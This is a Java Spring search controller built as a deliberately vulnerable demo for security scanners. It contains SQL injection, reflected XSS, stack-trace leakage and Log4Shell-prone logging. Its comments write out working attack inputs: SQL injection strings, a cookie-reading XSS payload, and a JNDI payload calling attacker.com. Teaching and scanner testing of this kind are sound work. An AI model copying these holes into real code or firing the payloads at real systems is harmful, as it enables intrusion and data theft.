package com.example.vulnerable.controller;

import org.springframework.beans.factory.annotation.Autowired;
import org.springframework.jdbc.core.JdbcTemplate;
import org.springframework.web.bind.annotation.*;
import org.springframework.http.ResponseEntity;
import org.apache.logging.log4j.LogManager;
import org.apache.logging.log4j.Logger;

import java.util.List;
import java.util.Map;

/**
 * ──────────────────────────────────────────────────────────────────
 * VULNERABILITY DEMO: SQL Injection + XSS + Sensitive Data Logging
 * ──────────────────────────────────────────────────────────────────
 *
 * Detected by:
 *   SonarQube – flags string concatenation in SQL queries
 *   OWASP ZAP – detects SQL injection and XSS at runtime
 */
@RestController
@RequestMapping("/search")
public class SearchController {

    // ⚠️ VULNERABILITY: Using Log4j 2.14.1 (Log4Shell CVE-2021-44228)
    // Any user-supplied input logged here can trigger JNDI injection
    private static final Logger log = LogManager.getLogger(SearchController.class);

    @Autowired
    private JdbcTemplate jdbcTemplate;

    /**
     * ⚠️ VULNERABILITY 1: SQL Injection
     *
     * The 'name' parameter is concatenated directly into the SQL query
     * without sanitization or parameterized queries.
     *
     * Attack example:
     *   GET /search/users?name=' OR '1'='1
     *   GET /search/users?name=' UNION SELECT table_name,null FROM information_schema.tables--
     *
     * Safe fix would be: jdbcTemplate.query("SELECT * FROM users WHERE name = ?", name)
     */
    @GetMapping("/users")
    public ResponseEntity<?> searchUsers(@RequestParam String name) {

        // ⚠️ VULNERABILITY: Log4Shell – logs untrusted user input directly
        // Payload: name=${jndi:ldap://attacker.com/exploit}
        log.info("Searching for user: " + name);

        // ⚠️ VULNERABILITY: SQL Injection – string concatenation in query
        String query = "SELECT * FROM users WHERE name = '" + name + "'";
        log.info("Executing query: " + query);

        try {
            List<Map<String, Object>> results = jdbcTemplate.queryForList(query);
            return ResponseEntity.ok(results);
        } catch (Exception e) {
            // ⚠️ VULNERABILITY: Exposes full stack trace and query to the client
            return ResponseEntity.status(500).body(
                Map.of("error", e.getMessage(), "query", query)
            );
        }
    }

    /**
     * ⚠️ VULNERABILITY 2: Cross-Site Scripting (XSS) – Reflected
     *
     * The 'query' parameter is reflected directly into the HTML response
     * without encoding or sanitization.
     *
     * Attack example:
     *   GET /search/products?query=<script>alert('XSS')</script>
     *   GET /search/products?query=<img src=x onerror=alert(document.cookie)>
     *
     * Detected by: OWASP ZAP (active scan)
     */
    @GetMapping(value = "/products", produces = "text/html")
    public String searchProducts(@RequestParam String query) {

        // ⚠️ VULNERABILITY: User input reflected in HTML without encoding
        return "<html><body>"
            + "<h1>Search Results for: " + query + "</h1>"
            + "<p>No products found matching your search.</p>"
            + "</body></html>";
    }
}
